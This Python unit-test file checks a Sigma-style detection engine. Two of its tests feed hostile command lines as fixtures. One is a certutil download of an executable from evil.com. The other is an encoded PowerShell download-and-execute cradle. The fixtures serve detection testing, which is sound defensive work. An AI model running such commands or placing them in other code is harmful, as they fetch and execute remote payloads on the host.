"""
Unit tests for the Sigma-style rule evaluation engine.
"""

from sentineltrace.rules import RuleEngine
from sentineltrace.types import MITRETactic, ProcessEvent, ProcessEventType, ThreatSeverity


def test_sigma_certutil_download_rule():
    """Verify Sigma rule SIG_001 catches certutil ingress tool transfer."""
    engine = RuleEngine()
    ev = ProcessEvent(
        event_id="EVT_CERT",
        event_type=ProcessEventType.PROCESS_START,
        pid=3200,
        ppid=1000,
        process_name="certutil.exe",
        image_path="C:\\Windows\\System32\\certutil.exe",
        command_line="certutil.exe -urlcache -split -f http://evil.com/c2.exe C:\\temp\\c2.exe",
        parent_name="cmd.exe",
        user="CORP\\user",
    )
    alerts = engine.evaluate_event(ev)
    assert len(alerts) == 1
    assert alerts[0].technique_id == "T1105"
    assert alerts[0].severity == ThreatSeverity.HIGH


def test_sigma_powershell_encoded_rule():
    """Verify Sigma rule SIG_002 catches obfuscated encoded PowerShell commands."""
    engine = RuleEngine()
    ev = ProcessEvent(
        event_id="EVT_ENC_PS",
        event_type=ProcessEventType.PROCESS_START,
        pid=3400,
        ppid=1000,
        process_name="powershell.exe",
        image_path="C:\\Windows\\System32\\powershell.exe",
        command_line="powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA=",
        parent_name="cmd.exe",
        user="CORP\\user",
    )
    alerts = engine.evaluate_event(ev)
    assert len(alerts) == 1
    assert alerts[0].technique_id == "T1059.001"
    assert alerts[0].tactic == MITRETactic.DEFENSE_EVASION


def test_sigma_benign_command_clean():
    """Verify standard legitimate command produces zero false positive alerts."""
    engine = RuleEngine()
    ev = ProcessEvent(
        event_id="EVT_CLEAN",
        event_type=ProcessEventType.PROCESS_START,
        pid=1500,
        ppid=1000,
        process_name="notepad.exe",
        image_path="C:\\Windows\\notepad.exe",
        command_line="notepad.exe C:\\Users\\user\\notes.txt",
        parent_name="explorer.exe",
        user="CORP\\user",
    )
    assert engine.evaluate_event(ev) == []
